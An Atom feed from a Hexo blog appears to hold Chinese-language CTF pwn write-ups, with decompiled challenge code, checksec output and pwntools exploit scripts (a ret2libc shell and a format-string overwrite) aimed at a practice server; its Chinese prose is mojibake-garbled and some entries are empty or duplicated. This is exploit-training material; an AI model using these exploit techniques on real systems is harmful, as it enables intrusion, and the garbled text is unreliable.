<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>EUREKA!</title>
  
  
  <link href="https://www.fomal.cc/atom.xml" rel="self"/>
  
  <link href="https://www.fomal.cc/"/>
  <updated>2023-04-09T06:24:30.169Z</updated>
  <id>https://www.fomal.cc/</id>
  
  <author>
    <name>EUREKAğŸŠ</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ciscn_2019_ne_5</title>
    <link href="https://www.fomal.cc/posts/580985ae.html"/>
    <id>https://www.fomal.cc/posts/580985ae.html</id>
    <published>2023-04-09T06:25:05.476Z</published>
    <updated>2023-04-09T06:24:30.169Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æ‘˜è¦">æ‘˜è¦</h2><h2 id="1-é€†å‘">1.é€†å‘</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">AddLog</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input new log info:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __isoc99_scanf(<span class="string">&quot;%128s&quot;</span>, a1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">Display</span><span class="params">(<span class="type">char</span> *s)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">Print</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo Printing......&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">GetFlag</span><span class="params">(<span class="type">char</span> *src)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">4</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">60</span>]; <span class="comment">// [esp+4h] [ebp-44h] BYREF</span></span><br><span class="line"></span><br><span class="line">  *(_DWORD *)dest = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v3, <span class="number">0</span>, <span class="keyword">sizeof</span>(v3));</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;The flag is your log:%s\n&quot;</span>, dest);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+0h] [ebp-100h] BYREF</span></span><br><span class="line">  <span class="type">char</span> src[<span class="number">4</span>]; <span class="comment">// [esp+4h] [ebp-FCh] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">124</span>]; <span class="comment">// [esp+8h] [ebp-F8h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">4</span>]; <span class="comment">// [esp+84h] [ebp-7Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">96</span>]; <span class="comment">// [esp+88h] [ebp-78h] BYREF</span></span><br><span class="line">  <span class="type">int</span> *p_argc; <span class="comment">// [esp+F4h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  *(_DWORD *)s1 = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v8, <span class="number">0</span>, <span class="keyword">sizeof</span>(v8));</span><br><span class="line">  *(_DWORD *)src = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="keyword">sizeof</span>(v6));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to use LFS.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input admin password:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%100s&quot;</span>, s1);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s1, <span class="string">&quot;administrator&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Password Error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your operation:&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.Add a log.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.Display all logs.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.Print all logs.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;0.Exit\n:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">switch</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      AddLog(src);</span><br><span class="line">      result = sub_804892B(argc, argv, envp);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      Display(src);</span><br><span class="line">      result = sub_804892B(argc, argv, envp);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      Print();</span><br><span class="line">      result = sub_804892B(argc, argv, envp);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      GetFlag(src);</span><br><span class="line">      result = sub_804892B(argc, argv, envp);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      result = sub_804892B(argc, argv, envp);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-æ¼æ´åˆ†æ">2.æ¼æ´åˆ†æ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><h2 id="3-exploit">3.exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;æ‘˜è¦&quot;&gt;æ‘˜è¦&lt;/h2&gt;
&lt;h2 id=&quot;1-é€†å‘&quot;&gt;1.é€†å‘&lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;s</summary>
      
    
    
    
    <category term="é¢˜è§£" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>jarvisoj_le vel3 WP</title>
    <link href="https://www.fomal.cc/posts/b1cdfc12.html"/>
    <id>https://www.fomal.cc/posts/b1cdfc12.html</id>
    <published>2023-04-09T06:25:05.466Z</published>
    <updated>2023-04-09T06:24:16.836Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æ‘˜è¦">æ‘˜è¦</h2><p>å·®ä¸å¤šçš„æ¨¡æ¿æ‡’å¾—å†™åˆ†æäº†,ç›´æ¥è´´ä¸Šexp,è¿™é‡Œå› ä¸ºä¸¤ä¸ªLibcSearcherçš„åŸå› ,äº‘ç«¯çš„LibcSearcheræ‰¾ä¸åˆ°Libcç‰ˆæœ¬,ä½†æ˜¯æœ¬åœ°çš„ç‰ˆæœ¬åˆå¤ªæ—§äº†,æ‰€ä»¥æˆ‘ç›´æ¥æŠŠä¸¤ä¸ªç‰ˆæœ¬åˆ äº†é‡æ–°å®‰è£…äº†çš„æœ¬åœ°LibcSearcher,æœ€åæ€»ç®—æ‰“é€šäº†ğŸ˜­.</p><h2 id="1-é€†å‘">1.é€†å‘</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">136</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Input:\n&quot;</span>, <span class="number">7u</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">256u</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Hello, World!\n&quot;</span>, <span class="number">14u</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-æ¼æ´åˆ†æ">2.æ¼æ´åˆ†æ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><h2 id="3-exp">3.exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28812</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main=<span class="number">0x8048484</span></span><br><span class="line">offset=<span class="number">0x88</span>+<span class="number">0x4</span></span><br><span class="line">ret=<span class="number">0x80482da</span></span><br><span class="line"></span><br><span class="line">payload=cyclic(offset)+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause(1)</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Input:\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">write_addr=u32(io.recv(<span class="number">4</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">base=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=cyclic(offset)+p32(system)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_sh)</span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Input:\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;æ‘˜è¦&quot;&gt;æ‘˜è¦&lt;/h2&gt;
&lt;p&gt;å·®ä¸å¤šçš„æ¨¡æ¿æ‡’å¾—å†™åˆ†æäº†,ç›´æ¥è´´ä¸Šexp,è¿™é‡Œå› ä¸ºä¸¤ä¸ªLibcSearcherçš„åŸå› ,äº‘ç«¯çš„LibcSearcheræ‰¾ä¸åˆ°Libcç‰ˆæœ¬,ä½†æ˜¯æœ¬åœ°çš„ç‰ˆæœ¬åˆå¤ªæ—§äº†,æ‰€ä»¥æˆ‘ç›´æ¥æŠŠä¸¤ä¸ªç‰ˆæœ¬åˆ äº†é‡æ–°å®‰è£…äº†çš„æœ¬åœ°LibcSearcher,æœ€åæ€»ç®—</summary>
      
    
    
    
    <category term="é¢˜è§£" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>jarvisoj_fm WP</title>
    <link href="https://www.fomal.cc/posts/c43912f5.html"/>
    <id>https://www.fomal.cc/posts/c43912f5.html</id>
    <published>2023-04-09T06:25:05.455Z</published>
    <updated>2023-04-09T06:24:05.430Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æ‘˜è¦">æ‘˜è¦</h2><p>x86ä¸‹æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„åˆ†æå’Œåˆ©ç”¨,çŸ¥è¯†ç‚¹è¡¥å……åœ¨äº†ç¬”è®°æ–‡ç« é‡Œ.</p><h2 id="1-é€†å‘">1.é€†å‘</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">80</span>]; <span class="comment">// [esp+2Ch] [ebp-5Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+7Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  be_nice_to_people();</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">80u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d!\n&quot;</span>, x);</span><br><span class="line">  <span class="keyword">if</span> ( x == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;running sh...&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-æ¼æ´åˆ†æ">2.æ¼æ´åˆ†æ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>æƒ¯ä¾‹æ£€æŸ¥ä¸€ä¸‹å®‰å…¨é˜²æŠ¤,é™¤äº†PIEå‡ ä¹éƒ½å…¨å¼€äº†,ä½†æ˜¯åç¼–è¯‘çš„ä»£ç é‡Œæœ‰å¾ˆæ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´,éœ€è¦æˆ‘ä»¬ä¿®æ”¹.dataæ®µä¸Šçš„xä¸º4,å°±å¯ä»¥è°ƒç”¨shelläº†,æˆ‘ä»¬è¾“å…¥ä¸€ä¸²<code>%p</code>æ¥æ‰¾æ‰¾æ ¼å¼åŒ–å­—ç¬¦ä¸²æœ¬ä½“çš„ä½ç½®(ä¸æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æŒ‡é’ˆçš„ä½ç½®).</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">00:0000â”‚ esp   0xffffcf90 â€”â–¸ 0xffffcfbc â—‚â€” &#x27;%p%p%p%p%p%p\n&#x27;</span><br><span class="line">01:0004â”‚       0xffffcf94 â€”â–¸ 0xffffcfbc â—‚â€” &#x27;%p%p%p%p%p%p\n&#x27;</span><br><span class="line">02:0008â”‚       0xffffcf98 â—‚â€” 0x50 /* &#x27;P&#x27; */</span><br><span class="line">03:000câ”‚       0xffffcf9c â€”â–¸ 0xf7ffc7e0 (_rtld_global_ro) â—‚â€” 0x0</span><br><span class="line">04:0010â”‚       0xffffcfa0 â—‚â€” 0x0</span><br><span class="line">05:0014â”‚       0xffffcfa4 â—‚â€” 0x0</span><br><span class="line">06:0018â”‚       0xffffcfa8 â€”â–¸ 0xf7ffd000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x2bf24</span><br><span class="line">07:001câ”‚       0xffffcfac â€”â–¸ 0xffffd0b4 â€”â–¸ 0xffffd297 â—‚â€” &#x27;/home/akira/Desktop/fm&#x27;</span><br><span class="line">08:0020â”‚       0xffffcfb0 â—‚â€” 0x0</span><br><span class="line">09:0024â”‚       0xffffcfb4 â—‚â€” 0x534</span><br><span class="line">0a:0028â”‚       0xffffcfb8 â—‚â€” 0xd /* &#x27;\r&#x27; */</span><br><span class="line">0b:002câ”‚ ebx   0xffffcfbc â—‚â€” &#x27;%p%p%p%p%p%p\n&#x27;</span><br></pre></td></tr></table></figure><p>é€šè¿‡è°ƒè¯•å‘ç°0004å¤„å°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå‚æ•°,æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æœ¬ä½“åœ¨002cå¤„,ä¹Ÿå°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬11ä¸ªå‚æ•°,é‚£ä¹ˆæˆ‘ä»¬æŠŠè¦ä¿®æ”¹çš„åœ°å€å¡«åœ¨ç¬¬11ä¸ªå‚æ•°å¤„,ç„¶ååœ¨åé¢æ¥ä¸Šä¸€ä¸ª<code>%11$n</code>,å› ä¸ºåœ°å€åˆšå¥½æ˜¯4ä¸ªå­—èŠ‚,æ‰€ä»¥æˆåŠŸåé¢çš„<code>%11$n</code>ä¼šæŠŠ4æ‰“å°åˆ°ç¬¬11ä¸ªå‚æ•°å¤„å­˜æ”¾çš„åœ°å€ä¸­,ä¿®æ”¹æˆåŠŸ.</p><h2 id="3-exp">3.exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28788</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./fm&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b main&#x27;)</span></span><br><span class="line">dest=<span class="number">0x804A02C</span></span><br><span class="line">payload=p32(dest)+<span class="string">b&#x27;%11$n&#x27;</span></span><br><span class="line"></span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;æ‘˜è¦&quot;&gt;æ‘˜è¦&lt;/h2&gt;
&lt;p&gt;x86ä¸‹æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„åˆ†æå’Œåˆ©ç”¨,çŸ¥è¯†ç‚¹è¡¥å……åœ¨äº†ç¬”è®°æ–‡ç« é‡Œ.&lt;/p&gt;
&lt;h2 id=&quot;1-é€†å‘&quot;&gt;1.é€†å‘&lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter</summary>
      
    
    
    
    <category term="é¢˜è§£" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>ciscn_2019_es_2 WP</title>
    <link href="https://www.fomal.cc/posts/ff0c2cc8.html"/>
    <id>https://www.fomal.cc/posts/ff0c2cc8.html</id>
    <published>2023-04-09T06:25:05.427Z</published>
    <updated>2023-04-09T06:23:26.749Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æ‘˜è¦">æ‘˜è¦</h2><p>è¿™é¢˜æ¶‰åŠåˆ°äº†æ ˆåŠ«æŒæ“ä½œ,éš¾åº¦å¼€å§‹é«˜èµ·æ¥äº†.</p><h2 id="1-é€†å‘">1.é€†å‘</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome, my friend. What&#x27;s your name?&quot;</span>);</span><br><span class="line">  vul();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome, my friend. What&#x27;s your name?&quot;</span>);</span><br><span class="line">  vul();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome, my friend. What&#x27;s your name?&quot;</span>);</span><br><span class="line">  vul();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-æ¼æ´åˆ†æ">2.æ¼æ´åˆ†æ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><h2 id="3-exploit">3.exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;æ‘˜è¦&quot;&gt;æ‘˜è¦&lt;/h2&gt;
&lt;p&gt;è¿™é¢˜æ¶‰åŠåˆ°äº†æ ˆåŠ«æŒæ“ä½œ,éš¾åº¦å¼€å§‹é«˜èµ·æ¥äº†.&lt;/p&gt;
&lt;h2 id=&quot;1-é€†å‘&quot;&gt;1.é€†å‘&lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;spa</summary>
      
    
    
    
    <category term="é¢˜è§£" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>ciscn_2019_ne_5 å¤ç°</title>
    <link href="https://www.fomal.cc/posts/1640936b.html"/>
